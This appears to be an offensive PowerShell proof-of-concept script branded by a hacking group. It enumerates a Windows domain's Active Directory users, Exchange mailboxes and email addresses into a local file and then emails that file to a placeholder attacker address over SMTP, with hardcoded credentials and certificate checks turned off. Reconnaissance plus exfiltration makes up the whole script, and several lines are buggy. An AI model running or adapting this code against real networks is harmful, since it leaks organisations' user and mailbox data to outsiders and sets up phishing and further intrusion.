import-module ActiveDirectory

function whoAmi {
    param(
        [string]$Message
    )

    Write-Host "Message: $Message"
}

whoAmi "DZLAB ELMO9AWIM =============== SMTP - LOGIN USER SYS ENUM  ================= $(get-date -f MM-dd)"
whoAmi -message "[START] = HACKING ITS FUN @DZHACKTEAM"


function Log-Message-alert
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output ("{0} - {1}" -f (Get-Date), $LogMessage)
    
    
}



$username = "attacker";
$password = "password";
$path = "C:\poc-$(get-date -f MM-dd).txt";

Get-CimInstance -Class CIM_ComputerSystem -ComputerName localhost -ErrorAction Stop | Select-Object * Copy | Out-File -FilePath $path;


$wholog = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name).Split('\')[1];


Get-ADUser -Filter * -Properties * | Select Name, DisplayName, SamAccountName, UserPrincipalName | Out-File -FilePath $path;
Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress | Sort-Object DisplayName | Out-File -FilePath $path;
Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress, @{Name="EmailAddresses";Expression={($_.EmailAddresses | Where-Object {$_ -clike "smtp*"} | ForEach-Object {$_ -replace "smtp:",""}) -join ","}} | Sort-Object DisplayName | Out-File -FilePath $path;
Get-Recipient | Select DisplayName, RecipientType, EmailAddresses | Out-File -FilePath $path;
Get-ADUser -Filter * -Properties EmailAddress,DisplayName, samaccountname| select EmailAddress, DisplayName | Out-File -FilePath $path;


function Send-ToEmail([string]$email, [string]$attachmentpath){

    $loged = Log-Message-alert " USER LOG IN $wholog "

    $message = new-object Net.Mail.MailMessage;
    $message.From = "attacker@domain.com";
    $message.To.Add($email);
    $message.Subject = "Describe Sent Results";
    $message.Body = $loged;
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);
    $smtp = new-object Net.Mail.SmtpClient("smtp.domain.com");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password);
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { return $true }
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "attacker@domain.com" -attachmentpath $path;

